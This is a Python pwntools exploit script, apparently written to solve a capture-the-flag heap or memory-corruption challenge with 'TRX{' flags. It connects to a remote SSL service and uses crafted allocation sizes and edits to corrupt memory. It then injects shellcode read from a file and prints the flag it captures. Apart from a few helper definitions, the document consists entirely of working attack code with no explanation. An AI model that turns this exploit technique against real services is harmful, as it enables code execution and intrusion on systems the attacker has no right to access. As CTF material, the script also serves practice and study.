#!/usr/bin/env python3
from pwn import *
import sys

context.terminal = ["pwntools-terminal"]

host, port = sys.argv[1].split(":")

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline
tube.rls	= tube.recvlines

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")	# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
"""

def conn():
	if args.LOCAL:
		return process(["./run.sh"])
	if args.GDB:
		return gdb.debug(["./run.sh"], gdbscript=GDB_SCRIPT)
	return remote(host, int(port), ssl=True)


def alloc(io, size):
	io.sa(b"> ", b"1\r")
	io.sa(b"> ", bstr(size) + b"\r")

def edit(io, index, data):
	io.sa(b"> ", b"2\r")
	io.sa(b"> ", bstr(index) + b"\r")
	io.sa(b"> ", data)

def show(io, index, port):
	io.sa(b"> ", b"3\r")
	io.sa(b"> ", bstr(index) + b"\r")
	io.sa(b"> ", bstr(port) + b"\r")


def main():
	io = conn()

	alloc(io, 0xc000-0x1000-1)
	alloc(io, 0xfff)
	alloc(io, 0xfffe-0xd000)
	alloc(io, 1)

	edit(io, 3, pack(0x92, 16)*(0xca0//2))
	show(io, 0, 0)

	with open("shellcode.bin", "rb") as f:
		shellcode = f.read()
	payload = flat({0x20: shellcode, 0x40: pack(0, 16) + pack(0, 16)})	# int8
	edit(io, 3, payload)

	io.recvuntil(b"TRX{")
	print(b"TRX{" + io.recvuntil(b"}"))

	io.close()

if __name__ == "__main__":
	main()
